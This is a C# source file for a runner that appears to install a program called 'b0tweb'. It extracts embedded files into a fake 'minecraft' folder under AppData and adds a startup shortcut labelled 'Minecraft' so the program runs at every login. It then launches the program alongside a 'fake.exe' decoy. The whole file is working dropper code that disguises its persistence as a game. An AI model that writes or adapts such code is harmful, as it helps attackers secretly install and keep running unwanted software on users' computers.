using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices.ComTypes;

namespace b0tweb_runner
{
    class Program
    {
        private static void StoreResource(string item, string path)
        {
            string[] parts = item.Split('.');
            string itemPath = path;

            if (parts[1] != "b0tweb")
            {
                itemPath = Path.Combine(path, parts[1]);
            }

            if (!Directory.Exists(itemPath))
            {
                Directory.CreateDirectory(itemPath);
            }

            string fileName = item.Remove(0, parts[0].Length + parts[1].Length + 2);
            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(item);

            FileStream fileStream = new FileStream(Path.Join(itemPath, fileName), FileMode.Create);
            for (int i = 0; i < stream.Length; i++)
            {
                fileStream.WriteByte((byte)stream.ReadByte());
            }

            fileStream.Close();
        }

        private static void CreateSymbolicLink(string path)
        {

            IShellLink link = (IShellLink)new ShellLink();
            // setup shortcut information
            link.SetDescription("Minecraft");
            link.SetPath(Path.Combine(path, "b0tweb.exe"));
            // save it
            IPersistFile file = (IPersistFile)link;
            file.Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "minecraft.lnk"), false);
        }

        static void Main(string[] args)
        {
            // Create all files
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string path = Path.Combine(appdata, "minecraft");
            Directory.CreateDirectory(path);

            foreach (string item in Assembly.GetExecutingAssembly().GetManifestResourceNames())
            {
                StoreResource(item, path);
            }

            CreateSymbolicLink(path);

            Process.Start(Path.Combine(path, "b0tweb.exe"));
            // Launch the "hidden" application
            Process.Start(Path.Combine(path, "faker", "fake.exe"));
        }
    }
}
